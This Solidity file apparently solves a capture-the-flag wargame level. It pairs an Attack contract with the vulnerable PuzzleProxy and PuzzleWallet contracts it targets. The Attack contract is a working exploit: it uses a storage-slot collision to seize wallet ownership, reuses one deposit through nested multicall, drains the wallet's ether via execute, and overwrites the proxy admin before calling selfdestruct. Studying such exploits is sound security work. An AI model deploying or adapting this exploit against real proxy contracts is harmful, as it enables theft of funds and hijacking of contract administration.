// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import "./contracts/math/SafeMath.sol";
import "./contracts/proxy/UpgradeableProxy.sol";

contract Attack {
    PuzzleProxy p;

    constructor(PuzzleProxy _p) public {
        p = _p;
    }

    function attack() external {
        // set pendingAdmin (PuzzleWallet.owner) to attacker
        p.proposeNewAdmin(address(this));
        PuzzleWallet w = PuzzleWallet(address(p));
        require(w.owner() == address(this), "wallet owner hijacking failed");
        // now puzzleWallet.owner is attacker, add attacker to whitelist
        w.addToWhitelist(address(this));
        // now set maxBalance to hijack admin of proxy to me
        // we need to firstly withdraw all balance from wallet
        //   1. balances[attack] should equal wallet.balance, we can achieve this by calling 
        //      deposit multiple times in the same delegatecall context
        bytes[] memory data = new bytes[](2);
        // 1st call deposit
        data[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory indcall = new bytes[](1);
        indcall[0] = abi.encodeWithSignature("deposit()");
        // 2st call multicall -> deposit
        data[1] = abi.encodeWithSignature("multicall(bytes[])", indcall);

        require(address(this).balance >= 1000000000000000, "insufficient balance");
        // this will call deposit twice with only once payment of 0.001 ether by
        // exploiting a subtile reentrancy vulneraibility in delegatecall
        w.multicall{value: 1000000000000000}(data);
        uint balance = w.balances(address(this));
        require(balance == address(w).balance, "failed stealing money");
        //   2. withdraw all balance in wallet with wallet.execute
        w.execute(address(this), balance, "");
        
        require(address(w).balance == 0, "money withdraw failed");
        // finally, set maxBalance to finish attack 
        w.setMaxBalance(uint256(uint160(tx.origin)));
        require(p.admin() == tx.origin, "attack failed.");
        selfdestruct(tx.origin);
    }

    receive() external payable {}
}

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call.value(value)(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}